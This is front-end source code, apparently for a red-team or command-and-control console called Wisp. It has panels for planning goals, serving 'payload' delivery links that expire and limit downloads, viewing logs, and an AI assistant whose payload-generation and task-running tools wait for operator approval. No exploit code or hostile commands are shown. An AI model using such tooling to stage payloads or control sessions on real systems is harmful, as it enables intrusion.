  const gStatus = (st: string) => ({ draft: t('goalDraftS'), running: t('goalRunning'), paused: t('goalPaused'), awaiting: t('goalAwaiting'), done: t('goalDone'), failed: t('goalFailed') }[st] ?? st);

  return (
    <div className={asTab ? 'tabpage' : 'settings'}>
      <div className="set-body">
        <section>
          <h3>{t('goalTitle')}</h3>
          <p className="set-hint">{t('goalHint')}</p>
          <div className="lsn-new">
            <input style={{ flex: 1 }} placeholder={t('goalPh')} value={goalPrompt} onChange={(e) => setGoalPrompt(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && void aiPlan()} />
            <button className="p" disabled={!!busy} onClick={() => void aiPlan()}>✨ {busy || t('goalPlan')}</button>
            <button onClick={() => void addManual()}>{t('goalManual')}</button>
          </div>
          {planSteps && (
            <div className="plan-box">
              <div className="plan-hd">{t('goalDraft')} ({planSteps.length}) <button className="p" onClick={() => void savePlan()}>{t('goalSaveDraft')}</button><button onClick={() => setPlanSteps(null)}>{t('goalDiscard')}</button></div>
              {(planSteps as { name: string; kind: string }[]).map((p, i) => (
                <div key={i} className="plan-step">{STEP_ICON[p.kind] ?? '•'} {i + 1}. {p.name} <i>{p.kind}</i></div>
              ))}
            </div>
          )}
        </section>
        <section className="goal-grid">
          <div className="rep-list">
            {goals.map((g) => (
              <div key={g.id} className={`rep-item${cur === g.id ? ' on' : ''}`} onClick={() => void openGoal(g.id)}>
                <span>{g.title}<i>{gStatus(g.status)}</i></span>
                <button className="rep-x" onClick={(e) => { e.stopPropagation(); if (confirm(t('delGoal'))) { void post(`/api/goals/${g.id}`, undefined, 'DELETE').then(() => { if (cur === g.id) setCur(''); void loadGoals(); }); } }}>✕</button>
              </div>
            ))}
            {!goals.length && <div className="empty">{t('goalNone')}</div>}
          </div>
          <div className="goal-detail">
            {goalMeta ? (
              <>
                <div className="rep-bar">
                  <b>{goalMeta.title}</b>
                  <span className={`goal-st gs-${goalMeta.status}`}>{gStatus(goalMeta.status)}</span>
                  <span style={{ marginLeft: 'auto', display: 'flex', gap: 6 }}>
                    {(goalMeta.status === 'draft' || goalMeta.status === 'paused' || goalMeta.status === 'failed') && <button className="p" onClick={() => void post(`/api/goals/${cur}/start`).then(() => openGoal(cur))}>{t('goalStart')}</button>}
                    {goalMeta.status === 'running' || goalMeta.status === 'awaiting' ? <button onClick={() => void post(`/api/goals/${cur}/pause`).then(() => openGoal(cur))}>{t('goalPause')}</button> : null}
                  </span>
                </div>
                <GoalCanvas
                  goalId={cur} title={goalMeta.title} goalStatus={goalMeta.status} steps={steps}
                  onGate={(id, ok) => void gate(id, ok)}
                  onDel={(id) => { if (confirm(t('delStep'))) void post(`/api/steps/${id}`, undefined, 'DELETE').then(() => openGoal(cur)); }}
                  approve={t('gateApprove')} reject={t('gateReject')} onSel={setSel}
                />
                {sel && (() => {
                  const st = steps.find((x) => x.id === sel);
                  if (!st) return null;
                  return <StepInspector key={st.id + st.args} step={st} editable={goalMeta.status === 'draft' || goalMeta.status === 'paused'}
                    onSave={async (patch) => { await post(`/api/steps/${st.id}`, patch, 'PATCH'); setSel(null); void openGoal(cur); useStore.getState().toast({ kind: 'ok', text: T('stepSaved') }); }}
                    del={() => { if (confirm(t('delStep'))) void post(`/api/steps/${st.id}`, undefined, 'DELETE').then(() => { setSel(null); openGoal(cur); }); }}
                  />;
                })()}
                <div className="goal-steps">
                  <div className="gstep-add">
                    {t('addStep')}
                    {(['task', 'plugin', 'gate', 'wait', 'note'] as const).map((k) => <button key={k} onClick={() => void addStep(k)}>{STEP_ICON[k]} {k}</button>)}
                  </div>
                </div>
              </>
            ) : <div className="empty" style={{ padding: 30 }}>{t('goalPick')}</div>}
          </div>
        </section>
      </div>
    </div>
  );
}


// ================= 文件服务器（投递 / 分享） =================

function FServerPanel({ asTab }: { asTab?: boolean }) {
  const { t } = useI18n();
  const [st, setSt] = useState<FServerStatus | null>(null);
  const [root, setRoot] = useState('');
  const [addr, setAddr] = useState(':8888');
  const [host, setHost] = useState('');
  const [mode, setMode] = useState('both');
  const [tls, setTls] = useState(false);
  const [tab, setTab] = useState<'delivery' | 'share'>('delivery');
  const [deliveries, setDeliveries] = useState<DeliveryRow[]>([]);
  const [shares, setShares] = useState<ShareRow[]>([]);
  const [files, setFiles] = useState<RootFileRow[]>([]);
  const [payloads, setPayloads] = useState<PayloadMeta[]>([]);
  const [payloadID, setPayloadID] = useState('');
  const [ttlMin, setTtlMin] = useState(60);
  const [maxDl, setMaxDl] = useState(0);
  const [ct, setCt] = useState('application/octet-stream');
  const [shareFile, setShareFile] = useState('');
  const [sharePass, setSharePass] = useState('');
  const [msg, setMsg] = useState('');
  const init = useRef(false);

  const refreshLinks = async () => {
    const [d, sh] = await Promise.all([Api.deliveries.list(), Api.shares.list()]);
    setDeliveries(d);
    setShares(sh);
    try {
      const fs = await Api.shares.files();
      setFiles(fs);
      if (!shareFile && fs.length) setShareFile(fs[0].path);
    } catch {
      setFiles([]);
    }
  };
  const load = async () => {
    try {
      const s = await Api.fserver.status();
      setSt(s);
      if (!init.current) {
        init.current = true;
        setRoot(s.root_dir || '');
        setAddr(s.addr || `:${s.port || 8888}`);
        setHost(s.host || '');
        setTls(s.use_tls);
        setMode(s.mode || 'both');
      }
      const pl = await Api.payloads.list();
      setPayloads(pl);
      if (!payloadID && pl[0]) setPayloadID(pl[0].id);
      await refreshLinks();
    } catch (e) {
      setMsg(`⚠ ${e instanceof Error ? e.message : String(e)}`);
    }
  };
  useEffect(() => { void load(); /* eslint-disable-next-line */ }, []);

  const apply = async (enabled: boolean) => {
    try {
      const cfg: FServerConfig = { root_dir: root.trim(), addr: addr.trim(), host: host.trim(), use_tls: tls, enabled, mode };
      const r = await Api.fserver.apply(cfg);
      setSt(r);
      setMsg('');
    } catch (e) {
      setMsg(`⚠ ${e instanceof Error ? e.message : String(e)}`);
    }
  };
  const createDelivery = async () => {
    if (!payloadID) return;
    try {
      const d = await Api.deliveries.create({ payload_id: payloadID, ttl_seconds: Math.max(0, ttlMin) * 60, max_downloads: Math.max(0, maxDl), content_type: ct });
      await copy(d.url, t('fsCopied'));
      await refreshLinks();
      setMsg(`✓ ${t('fsLinkCreated')}`);
    } catch (e) {
      setMsg(`⚠ ${e instanceof Error ? e.message : String(e)}`);
    }
  };
  const createShare = async () => {
    if (!shareFile) return;
    try {
      const s = await Api.shares.create({ file: shareFile, ttl_seconds: Math.max(0, ttlMin) * 60, max_downloads: Math.max(0, maxDl), password: sharePass });
      await copy(s.url, t('fsCopied'));
      await refreshLinks();
      setMsg(`✓ ${t('fsLinkCreated')}`);
    } catch (e) {
      setMsg(`⚠ ${e instanceof Error ? e.message : String(e)}`);
    }
  };
  const patchDelivery = async (row: DeliveryRow, body: { expires_in_seconds?: number; revoked?: boolean }) => {
    await Api.deliveries.patch(row.id, body);
    await refreshLinks();
  };
  const patchShare = async (row: ShareRow, body: { expires_in_seconds?: number; revoked?: boolean }) => {
    await Api.shares.patch(row.id, body);
    await refreshLinks();
  };
  const dropDelivery = async (row: DeliveryRow) => {
    await Api.deliveries.remove(row.id);
    await refreshLinks();
  };
  const dropShare = async (row: ShareRow) => {
    await Api.shares.remove(row.id);
    await refreshLinks();
  };
  const exp = (sec?: number) => sec ? new Date(sec * 1000).toLocaleString() : t('fsNever');
  const left = (row: { max_downloads?: number; downloads: number }) =>
    row.max_downloads ? `${row.downloads}/${row.max_downloads}` : `${row.downloads}`;

  return (
    <div className={asTab ? 'tabpage' : 'settings'}>
      <div className="set-body">
        <section>
          <h3>{t('fsTitle')}</h3>
          <p className="set-hint">{t('fsHint')}</p>
          <div className="lsn-new">
            <input style={{ flex: 1 }} value={root} onChange={(e) => setRoot(e.target.value)} placeholder={t('fsRootPh')} />
            <input style={{ width: 140 }} value={addr} onChange={(e) => setAddr(e.target.value)} placeholder=":8888" />
            <input style={{ width: 130 }} value={host} onChange={(e) => setHost(e.target.value)} placeholder={t('fsHostPh')} />
            <select value={mode} onChange={(e) => setMode(e.target.value)}>
              <option value="both">{t('fsModeBoth')}</option>
              <option value="delivery">{t('fsModeDelivery')}</option>
              <option value="share">{t('fsModeShare')}</option>
            </select>
            <label className="tgl-wrap" style={{ margin: 0 }}><input type="checkbox" checked={tls} onChange={(e) => setTls(e.target.checked)} /><i></i><span>TLS</span></label>
            <button className="p" onClick={() => void apply(true)}>{st?.running ? t('fsRestart') : t('fsStart')}</button>
            {st?.running && <button onClick={() => void apply(false)}>{t('fsStop')}</button>}
          </div>
          {msg && <p className="set-msg" style={{ color: msg.startsWith('⚠') ? 'var(--err)' : 'var(--ok)' }}>{msg}</p>}
          {st && (
            <div className="fs-status">
              <span className={st.running ? 'c-ok' : 'c-muted'}>● {st.running ? `${t('running')} · ${st.url}` : t('stopped')}</span>
              <span className="muted"> · {t('fsCounts')}: {st.deliveries} / {st.shares}</span>
            </div>
          )}
        </section>

        <section>
          <div className="agent-subtabs" style={{ padding: '0 0 8px', borderBottom: 0, background: 'transparent' }}>
            <button className={`agent-subtab${tab === 'delivery' ? ' on' : ''}`} onClick={() => setTab('delivery')}>{t('fsTabDelivery')}</button>
            <button className={`agent-subtab${tab === 'share' ? ' on' : ''}`} onClick={() => setTab('share')}>{t('fsTabShare')}</button>
          </div>

          {tab === 'delivery' ? (<>
            <div className="lsn-new">
              <select style={{ flex: 1 }} value={payloadID} onChange={(e) => setPayloadID(e.target.value)}>
                {payloads.map((p) => <option key={p.id} value={p.id}>{p.name} · {p.mode}</option>)}
              </select>
              <input style={{ width: 80 }} type="number" min={0} value={ttlMin} onChange={(e) => setTtlMin(+e.target.value)} title={t('fsTtlMin')} />
              <input style={{ width: 80 }} type="number" min={0} value={maxDl} onChange={(e) => setMaxDl(+e.target.value)} title={t('fsMaxDl')} />
              <input style={{ width: 160 }} value={ct} onChange={(e) => setCt(e.target.value)} title={t('fsContentType')} />
              <button className="p" disabled={!payloadID} onClick={() => void createDelivery()}>{t('fsCreateDelivery')}</button>
            </div>
            <table className="lsn-t">
              <thead><tr><th>{t('thFileName')}</th><th>{t('fsExpires')}</th><th>{t('fsDownloads')}</th><th>{t('fsTraffic')}</th><th>{t('thAct')}</th></tr></thead>
              <tbody>
                {deliveries.map((d) => (
                  <tr key={d.id} className={d.revoked ? 'muted' : ''}>
                    <td><span className="mono">{d.name}</span><br /><span className="mono fs-url" title={d.url} onClick={() => void copy(d.url, t('fsCopied'))}>{d.url}</span></td>
                    <td>{exp(d.expires_at)}</td>
                    <td>{left(d)}</td>
                    <td>{fmtSize(d.bytes_out)} · {d.requests}{t('fsReqShort')}</td>
                    <td className="pl-acts">
                      <button className="pl-mini" title={t('fsCopy')} onClick={() => void copy(d.url, t('fsCopied'))}>⧉</button>
                      <button className="pl-mini" title={t('fsExtend')} onClick={() => void patchDelivery(d, { expires_in_seconds: 86400 })}>↻</button>
                      <button className="pl-mini" title={t('fsForever')} onClick={() => void patchDelivery(d, { expires_in_seconds: 0 })}>∞</button>
                      <button className="pl-mini" title={t('fsRevoke')} onClick={() => void patchDelivery(d, { revoked: !d.revoked })}>{d.revoked ? '✓' : '🚫'}</button>
                      <button className="pl-mini danger" title={t('fsDelete')} onClick={() => void dropDelivery(d)}>✕</button>
                    </td>
                  </tr>
                ))}
                {!deliveries.length && <tr><td colSpan={5} className="empty">{t('fsNoLinks')}</td></tr>}
              </tbody>
            </table>
          </>) : (<>
            <div className="lsn-new">
              <select style={{ flex: 1 }} value={shareFile} onChange={(e) => setShareFile(e.target.value)}>
                {files.map((f) => <option key={f.path} value={f.path}>{f.path} ({fmtSize(f.size)})</option>)}
                {!files.length && <option value="">{t('fsNoFiles')}</option>}
              </select>
              <button onClick={() => void refreshLinks()} title={t('fsRefreshFiles')}>↻</button>
              <input style={{ width: 80 }} type="number" min={0} value={ttlMin} onChange={(e) => setTtlMin(+e.target.value)} title={t('fsTtlMin')} />
              <input style={{ width: 80 }} type="number" min={0} value={maxDl} onChange={(e) => setMaxDl(+e.target.value)} title={t('fsMaxDl')} />
              <input style={{ width: 140 }} type="password" value={sharePass} onChange={(e) => setSharePass(e.target.value)} placeholder={t('fsPasswordPh')} />
              <button className="p" disabled={!shareFile} onClick={() => void createShare()}>{t('fsCreateShare')}</button>
            </div>
            <table className="lsn-t">
              <thead><tr><th>{t('thFileName')}</th><th>{t('fsExpires')}</th><th>{t('fsDownloads')}</th><th>{t('fsTraffic')}</th><th>{t('thAct')}</th></tr></thead>
              <tbody>
                {shares.map((s) => (
                  <tr key={s.id} className={s.revoked ? 'muted' : ''}>
                    <td><span className="mono">{s.name}</span>{s.has_password ? ' 🔒' : ''}<br /><span className="mono fs-url" title={s.url} onClick={() => void copy(s.url, t('fsCopied'))}>{s.url}</span><br /><span className="muted mono">{s.file}</span></td>
                    <td>{exp(s.expires_at)}</td>
                    <td>{left(s)}</td>
                    <td>{fmtSize(s.bytes_out)} · {s.requests}{t('fsReqShort')}</td>
                    <td className="pl-acts">
                      <button className="pl-mini" title={t('fsCopy')} onClick={() => void copy(s.url, t('fsCopied'))}>⧉</button>
                      <button className="pl-mini" title={t('fsExtend')} onClick={() => void patchShare(s, { expires_in_seconds: 86400 })}>↻</button>
                      <button className="pl-mini" title={t('fsForever')} onClick={() => void patchShare(s, { expires_in_seconds: 0 })}>∞</button>
                      <button className="pl-mini" title={t('fsRevoke')} onClick={() => void patchShare(s, { revoked: !s.revoked })}>{s.revoked ? '✓' : '🚫'}</button>
                      <button className="pl-mini danger" title={t('fsDelete')} onClick={() => void dropShare(s)}>✕</button>
                    </td>
                  </tr>
                ))}
                {!shares.length && <tr><td colSpan={5} className="empty">{t('fsNoShares')}</td></tr>}
              </tbody>
            </table>
          </>)}
        </section>
      </div>
    </div>
  );
}

function TeamLogs() {
  const events = useStore((s) => s.events);
  const [lvl, setLvl] = useState('all');
  const [kind, setKind] = useState('all');
  const [q, setQ] = useState('');
  const [from, setFrom] = useState(0);
  const body = useRef<HTMLDivElement>(null);
  const stick = useRef(true);
  const { t } = useI18n();

  const list = useMemo(() => events.filter((e) => {
    const ts = new Date(e.time).getTime() / 1000;
    if (ts < from) return false;
    if (lvl !== 'all' && e.level !== lvl) return false;
    if (kind !== 'all' && e.kind !== kind) return false;
    const w = q.trim().toLowerCase();
    return !w || `${e.kind} ${e.text}`.toLowerCase().includes(w);
  }), [events, lvl, kind, q, from]);
  const kinds = useMemo(() => Array.from(new Set(events.map((e) => e.kind))).sort(), [events]);

  useEffect(() => {
    if (stick.current) body.current?.scrollTo({ top: body.current.scrollHeight });
  }, [list.length]);

  const cnt = (k: string) => events.filter((e) => e.level === k).length;
  const exportLog = () => {
    const txt = list.map((e) => `${e.time} [${e.level}/${e.kind}] ${e.text}`).join('\n');
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([txt], { type: 'text/plain' }));
    a.download = `wispp-logs-${new Date().toISOString().slice(0, 16).replace(/[-:T]/g, '')}.log`;
    a.click();
    URL.revokeObjectURL(a.href);
  };

  return (
    <div className="console col">
      <div className="lg-bar">
        <input value={q} onChange={(e) => setQ(e.target.value)} placeholder={T('logsSearch')} />
        {(['all', 'info', 'ok', 'warn', 'err'] as const).map((k) => (
          <button key={k} className={`lg-chip${lvl === k ? ' on' : ''}`} onClick={() => setLvl(k)}>
            {k === 'all' ? T('logsAll') : k}{k !== 'all' && ` ${cnt(k)}`}
          </button>
        ))}
        <select className="lg-chip" value={kind} onChange={(e) => setKind(e.target.value)}>
          <option value="all">kind: all</option>
          {kinds.map((k) => <option key={k} value={k}>{k} {events.filter((e) => e.kind === k).length}</option>)}
        </select>
        <span className="spacer" />
        <span className="lg-n">{list.length} / {events.length}</span>
        <button className="lg-chip" onClick={exportLog}>⬇ {T('logsExport')}</button>
        <button className="lg-chip" title={t('logsClearVis')} onClick={() => setFrom(Math.floor(Date.now() / 1000))}>⌫</button>
      </div>
      <div className="c-scroll" ref={body} onScroll={(e) => { const el = e.currentTarget; stick.current = el.scrollHeight - el.scrollTop - el.clientHeight < 48; }}>
        {list.length === 0 && <div className="c-line"><span className="c-out muted">{T('logsEmpty')}</span></div>}
        {list.slice(-500).map((e, i) => (
          <div className="c-line" key={i}>
            <span className="c-time">[{new Date(e.time).toLocaleTimeString()}]</span>
            <span className={e.level === 'ok' ? 'c-ok' : e.level === 'err' ? 'c-err' : e.level === 'warn' ? 'c-warn' : 'c-info'}>[{e.kind}]</span>
            <span className="c-out">&nbsp;{e.text}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

interface AiMsg {
  kind: 'user' | 'text' | 'tool' | 'approval';
  content?: string;
  name?: string;
  args?: string;
  ok?: boolean;
  aid?: string; // approval id
  state?: 'pending' | 'approved' | 'rejected';
  stream?: boolean; // live token bubble
}

type AiStatus = { enabled: boolean; active?: string; profiles?: { name: string; model: string }[]; pending?: number };
type Conv = { id: string; title: string; updated: number };

async function apiFetch(path: string, init?: RequestInit) {
  return fetch(path, {
    ...init,
    headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json', ...(init?.headers ?? {}) },
  });
}

function aiHeaders(): Record<string, string> {
  return { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '' };
}

async function aiStream(path: string, body: unknown, onEvent: (e: Record<string, string | boolean | undefined>) => void, signal?: AbortSignal) {
  const r = await fetch(path, {
    method: 'POST',
    headers: aiHeaders(),
    body: JSON.stringify(body),
    signal,
  });
  const reader = r.body!.getReader();
  const dec = new TextDecoder();
  let buf = '';
  for (;;) {
    const { value, done } = await reader.read();
    if (done) break;
    buf += dec.decode(value, { stream: true });
    let i: number;
    while ((i = buf.indexOf('\n\n')) >= 0) {
      const chunk = buf.slice(0, i);
      buf = buf.slice(i + 2);
      const line = chunk.split('\n').find((l) => l.startsWith('data: '));
      if (line) {
        try { onEvent(JSON.parse(line.slice(6))); } catch { /* skip */ }
      }
    }
  }
}

interface HistRow { role: string; content: string; tool_calls?: string; tool_call_id?: string; name?: string }

// restore maps persisted messages into UI cards, including pending approvals.
function restore(rows: HistRow[], pending: { id: string; tool: string; args: string; conv: string }[]): AiMsg[] {
  const out: AiMsg[] = [];
  const writeTools = new Set(['run_task', 'gen_payload', 'delete_session']);
  for (const m of rows) {
    if (m.role === 'user') out.push({ kind: 'user', content: m.content });
    else if (m.role === 'assistant' && m.content) out.push({ kind: 'text', content: m.content });
    else if (m.role === 'tool' && m.name) {
      let c = m.content ?? '';
      if (writeTools.has(m.name) && c.includes('"pending_approval"')) {
        let aid = '';
        try { aid = JSON.parse(c).pending_approval ?? ''; } catch { /* keep */ }
        const still = pending.find((x) => x.id === aid);
        out.push({ kind: 'approval', aid, name: m.name, args: still?.args ?? '', state: still ? 'pending' : 'approved' });
      } else if (writeTools.has(m.name) && (c.includes('"rejected"'))) {
        out.push({ kind: 'approval', name: m.name, args: '', state: 'rejected' });
      } else {
        out.push({ kind: 'tool', name: m.name, content: c.slice(0, 4000), ok: !c.includes('"error"') });
      }
    }
  }
  return out;
}

function AIPanel() {
  const { t } = useI18n();
  const [status, setStatus] = useState<AiStatus | null>(null);
  const [msgs, setMsgs] = useState<AiMsg[]>([]);
  const [input, setInput] = useState('');
  const [busy, setBusy] = useState(false);
  const [convs, setConvs] = useState<Conv[]>([]);
  const [menu, setMenu] = useState(false);
  const [renaming, setRenaming] = useState<string | null>(null); // conv id in rename mode
  const conv = useRef('');
  const abort = useRef<AbortController | null>(null);
  const body_ = useRef<HTMLDivElement>(null);
  const selected = useStore((s) => s.selected);
  const aiOpen = useStore((s) => s.aiOpen);
  const setAiOpen = useStore((s) => s.setAiOpen);

  const refreshStatus = () => apiFetch('/api/ai/status').then((r) => r.json()).then((st: AiStatus) => setStatus(st)).catch(() => setStatus({ enabled: false }));
  const refreshConvs = () => { const p = useStore.getState().project; return apiFetch(`/api/ai/conversations${p ? `?project=${encodeURIComponent(p)}` : ''}`).then((r) => r.json()).then((c: Conv[]) => setConvs(Array.isArray(c) ? c : [])).catch(() => {}); };

  useEffect(() => {
    void refreshStatus();
    void (async () => {
      const cs = await apiFetch(`/api/ai/conversations${useStore.getState().project ? `?project=${encodeURIComponent(useStore.getState().project)}` : ''}`).then((r) => r.json()).catch(() => []);
      if (Array.isArray(cs) && cs.length) {
        setConvs(cs);
        await openConv((cs as Conv[])[0].id);
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => { body_.current?.scrollTo({ top: body_.current.scrollHeight, behavior: 'smooth' }); }, [msgs, busy]);
  useEffect(() => {
    if (!menu) return;
    const close = () => setMenu(false);
    window.addEventListener('click', close);
    return () => window.removeEventListener('click', close);
  }, [menu]);

  async function openConv(id: string) {
    abort.current?.abort();
    setMenu(false);
    setBusy(false);
    conv.current = id;
    const [rows, pend] = await Promise.all([
      apiFetch(`/api/ai/history?conv=${encodeURIComponent(id)}`).then((r) => r.json()).catch(() => []),
      apiFetch('/api/ai/approvals').then((r) => r.json()).catch(() => []),
    ]);
    setMsgs(restore(rows as HistRow[], Array.isArray(pend) ? pend : []));
  }

  const newConv = () => {
    abort.current?.abort();
    setMenu(false);
    setBusy(false);
    conv.current = '';
    setMsgs([]);
  };

  const rename = async (id: string, title: string) => {
    setRenaming(null);
    if (!title.trim()) return;
    await apiFetch(`/api/ai/conversations/${id}/rename`, { method: 'POST', body: JSON.stringify({ title }) });
    void refreshConvs();
  };

  const del = async (id: string) => {
    setMenu(false);
    if (!window.confirm(t('delConvConfirm'))) return;
    await apiFetch(`/api/ai/conversations/${id}`, { method: 'DELETE' });
    if (conv.current === id) newConv();
    void refreshConvs();
  };

  const push = (m: AiMsg) => setMsgs((x) => [...x, m]);
  const patchApproval = (aid: string, state: AiMsg['state']) =>
    setMsgs((x) => x.map((m) => (m.aid === aid ? { ...m, state } : m)));
  const closeStream = () => setMsgs((x) => x.map((y) => (y.stream ? { ...y, stream: undefined } : y)));

  const send = async (override?: string) => {
    const text = (override ?? input).trim();
    if (!text || busy || !status?.enabled) return;
    if (!override) setInput('');
    push({ kind: 'user', content: text });
    setBusy(true);
    abort.current = new AbortController();
    let newConvId = '';
    const feed = (e: Record<string, string | boolean | undefined>) => {
      if (e.type === 'token') {
        setMsgs((x) => {
          const copy = [...x];
          const last = copy[copy.length - 1];
          if (last && last.kind === 'text' && last.stream) {
            copy[copy.length - 1] = { ...last, content: (last.content ?? '') + String(e.content ?? '') };
          } else {
            copy.push({ kind: 'text', content: String(e.content ?? ''), stream: true });
          }
          return copy;
        });
      } else {
        closeStream();
        if (e.type === 'tool') {
          push({ kind: 'tool', name: String(e.name), content: String(e.content ?? ''), ok: e.ok === true });
        } else if (e.type === 'approval') {
          push({ kind: 'approval', aid: String(e.id), name: String(e.name), args: String(e.args ?? ''), state: 'pending' });
        } else if (e.type === 'done' && e.id) {
          newConvId = String(e.id);
        } else if (e.type === 'error') {
          push({ kind: 'text', content: `⚠ ${e.content}` });
        }
      }
    };
    try {
      await aiStream('/api/ai/chat', { conv: conv.current, text, lang: useI18n.getState().lang, project: useStore.getState().project || 'default' }, feed, abort.current.signal);
    } catch (err) {
      if (!String(err).includes('AbortError')) push({ kind: 'text', content: `⚠ ${String(err)}` });
    } finally {
      closeStream();
      setBusy(false);
      abort.current = null;
      if (newConvId) { conv.current = newConvId; void refreshConvs(); }
      void refreshStatus();
    }
  };

  const stop = () => { abort.current?.abort(); closeStream(); setBusy(false); };

  const decide = async (m: AiMsg, approve: boolean) => {
    if (!m.aid) return;
    patchApproval(m.aid, approve ? 'approved' : 'rejected');
    setBusy(true);
    const feed = (e: Record<string, string | boolean | undefined>) => {
      if (e.type === 'token') {
        setMsgs((x) => {
          const copy = [...x];
          const last = copy[copy.length - 1];
          if (last && last.kind === 'text' && last.stream) {
            copy[copy.length - 1] = { ...last, content: (last.content ?? '') + String(e.content ?? '') };
          } else {
            copy.push({ kind: 'text', content: String(e.content ?? ''), stream: true });
          }
          return copy;
        });
      } else if (e.type === 'tool' && e.name === m.name && m.state === 'approved') {
        setMsgs((x) => [...x.filter((y) => !(y.kind === 'text' && y.stream)),
          { kind: 'tool', name: String(e.name), content: String(e.content ?? ''), ok: e.ok === true }]);
      } else if (e.type === 'error') {
        push({ kind: 'text', content: `⚠ ${e.content}` });
      }
    };
    try { await aiStream(`/api/ai/approvals/${m.aid}/decide`, { approve }, feed); }
    catch { push({ kind: 'text', content: T('approveFail') }); }
    closeStream();
    setBusy(false);
    void refreshStatus();
  };

  const activeTitle = conv.current ? (convs.find((c) => c.id === conv.current)?.title ?? T('newConvT')) : T('newConvT');

  if (!aiOpen) {
    return (
      <div className="ai closed">
        <div className="ai-strip-btn" title={T('aiShow')} onClick={() => setAiOpen(true)}>
          <div className={`ai-orb${status?.enabled ? '' : ' off'}`} />
          {(status?.pending ?? 0) > 0 && <span className="pend-badge">{status!.pending}</span>}
          <div className="ai-strip-lbl">AI</div>
        </div>
        <span className="spacer" />
        <div className="rail-toggle" title={T('aiShow')} onClick={() => setAiOpen(true)}>«</div>
      </div>
    );
  }

  return (
    <div className="ai">
      <div className="ai-hd">
        <div className={`ai-orb${status?.enabled ? '' : ' off'}`} />
        <div className="conv-ctx" onClick={(e) => { e.stopPropagation(); setMenu((x) => !x); }} title={T("convList")}>
          <span className="conv-name">{activeTitle}</span><span className="conv-caret">▾</span>
          {menu && (
            <div className="conv-menu" onMouseDown={(e) => e.stopPropagation()} onClick={(e) => e.stopPropagation()}>
              <div className="conv-item new" onClick={newConv}>{t('newConv')}</div>
              {convs.map((c) => (
                <div key={c.id} className={`conv-item${c.id === conv.current ? ' on' : ''}`}>
                  {renaming === c.id ? (
                    <input
                      autoFocus defaultValue={c.title}
                      onFocus={(e) => e.target.select()}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') void rename(c.id, (e.target as HTMLInputElement).value);
                        if (e.key === 'Escape') setRenaming(null);
                      }}
                      onBlur={(e) => void rename(c.id, e.target.value)}
                    />
                  ) : (
                    <>
                      <span className="conv-t" onClick={() => void openConv(c.id)} onDoubleClick={() => setRenaming(c.id)} title={T("convSwitchHint")}>
                        {c.title || c.id}
                      </span>
                      <span className="conv-x" title={t('delConv')} onClick={() => void del(c.id)}>✕</span>
                    </>
                  )}
                </div>
              ))}
              {!convs.length && <div className="conv-item dis">{t('noHist')}</div>}
            </div>
          )}
        </div>
        {(status?.pending ?? 0) > 0 && <span className="pend-badge" title={T("pendingOps")}>⚡{status!.pending}</span>}
        <span className="spacer" />
        <span className="ai-collapse" title={T('aiHide')} onClick={() => setAiOpen(false)}>»</span>
      </div>
      <div className="ai-body" ref={body_}>
        {status && !status.enabled && (
          <div className="msg a"><div className="who">SYSTEM</div>
            {T('aiOffTitle')}
            {T('aiOffRules')}
            <div style={{ marginTop: 8 }}>
              <button className="btn p" onClick={() => useStore.getState().setModal('settings')}>{T("goModelSettings")}</button>
            </div>
          </div>
        )}
        {msgs.map((m, i) => (
          <div key={i} style={{ display: 'contents' }}>
            {m.kind === 'user' && <div className="msg u"><div className="who">{t('operator')}</div>{m.content}</div>}
            {m.kind === 'text' && <div className="msg a"><div className="who">WISP AI</div><div className="md" dangerouslySetInnerHTML={{ __html: md2html(m.content ?? '') }} /><button className="msg-copy" title={t('msgCopy')} onClick={() => void copy(m.content ?? '', 'AI')}>⧉</button><button className="msg-copy" title={t('aiRegen')} onClick={() => { const lu = [...msgs].reverse().find((x) => x.kind === 'user'); if (lu) void send(lu.content); }}>↻</button></div>}
            {m.kind === 'tool' && (
              <div className="msg a"><div className="who">WISP AI</div>
                <ToolCard name={m.name ?? ''} content={m.content ?? ''} ok={!!m.ok} />
              </div>
            )}
            {m.kind === 'approval' && (
              <div className="msg a"><div className="who">WISP AI</div>
                <div className="tool">
                  <div className="tool-hd">{t('approvalTitle')} {m.name}</div>
                  <pre>{(m.args ?? '').slice(0, 300)}</pre>
                  {m.state === 'pending' ? (
                    <div className="tool-run">
                      <button className="btn p" onClick={() => decide(m, true)}>{t('approve')}</button>
                      <button className="btn g" onClick={() => decide(m, false)}>{t('reject')}</button>
                      <span className="note">{t('approvalNote')}</span>
                    </div>
                  ) : (
                    <div className="tool-run"><span style={{ fontSize: 11, color: m.state === 'approved' ? 'var(--ok)' : 'var(--err)' }}>
                      {m.state === 'approved' ? t('approvedRun') : t('rejectedWord')}
                    </span></div>
                  )}
                </div>
              </div>
            )}
          </div>
        ))}
        {busy && (
          <div className="typing-row">
            <div className="typing"><i /><i /><i /></div>
            <button className="stop-btn" onClick={stop} title={t('stopTitle')}>{t('stopGen')}</button>
          </div>
        )}
        {selected && !msgs.length && status?.enabled && (
          <div className="msg a"><div className="who">WISP AI</div>
            {t('aiReady')}
          </div>
        )}
      </div>
      {msgs.length === 0 && status?.enabled && (
        <div className="ai-sugs">
          <span>{t('aiSugTitle')}</span>
          {[t('sug1'), t('sug2'), t('sug3'), t('sug4')].map((s, i) => (
            <button key={i} onClick={() => void send(s)}>{s}</button>
          ))}
        </div>
      )}
      {status && !status.enabled && (
        <div className="ai-off-bar">
          <span className={`ai-orb off`} />
          {t('inputAiOff')}
        </div>
      )}
      {(!status || status.enabled) && (
        <div className="ai-input">
          <textarea placeholder={status?.enabled ? t('inputAiPh') : t('inputAiOff')}
            value={input} onChange={(e) => setInput(e.target.value)}
            onKeyDown={(e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); void send(); } }} />
          <div className="row2">
            <ModelPicker onChanged={() => void refreshStatus()} />
            <ThinkSelect />
            <span className="ctx mini" title={t('vendors')} onClick={() => useStore.getState().setModal('settings')}>
              {t('vendors')}
            </span>
            <div className={`send${status?.enabled ? '' : ' off'}`} onClick={() => void send()}>↑</div>
          </div>
        </div>
      )}
    </div>
  );
}


// ================= AI model access (Qoder-style: pick at input, add via dialog) =================

